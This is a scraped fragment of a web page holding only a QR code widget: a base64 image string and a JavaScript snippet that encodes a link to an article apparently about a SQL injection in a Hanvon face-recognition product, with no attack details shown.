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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 